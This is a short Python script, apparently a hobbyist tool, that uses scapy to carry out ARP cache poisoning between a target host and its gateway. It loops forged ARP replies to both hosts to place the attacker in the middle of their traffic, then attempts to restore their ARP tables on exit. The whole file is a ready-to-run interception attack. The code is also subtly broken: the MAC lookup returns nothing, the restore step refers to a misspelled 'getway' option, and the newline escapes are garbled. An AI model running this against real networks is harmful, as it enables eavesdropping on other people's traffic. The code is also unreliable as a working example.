#!/usr/bin/python3
import scapy.all as scapy
import time 
import argparse 



#Arg 
def get_argument ():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target")
    parser.add_argument("-g","--gateway",dest="gateway")
    option =parser.parse_args()
    return option
option = get_argument()


# Find MAC by IP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_rq_broadcast = broadcast / arp_request
    answer_list = scapy.srp(arp_rq_broadcast, timeout=1, verbose=False)[0]
    print("Answer list:", answer_list)



#Spoofer 
def spoof (targetIp,spoofIp):
    target_mac = get_mac(targetIp)
    packet = scapy.ARP(op=2,pdst = targetIp , hwdst = target_mac,psrc = spoofIp)
    scapy.send(packet,verbose=False)


# Reset Table
def reset(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    
    packet = scapy.ARP(op=2,pdst = dest_ip, hwdst = dest_mac,psrc = source_ip ,hwsrc = source_mac)
    scapy.send(packet,count = 4, verbose=False)


send_pack_count = 0
try :
    while True :
        spoof(option.target, option.gateway)
        spoof(option.gateway, option.target)
        send_pack_count +=2 
        print(f"\r[+] pack sent : {send_pack_count} ",end="")

except KeyboardInterrupt:
    print("n/CTRL+C .....Ending....Reast")
    reset(option.target, option.getway)
    reset(option.getway, option.target)
    print("n/REAST...")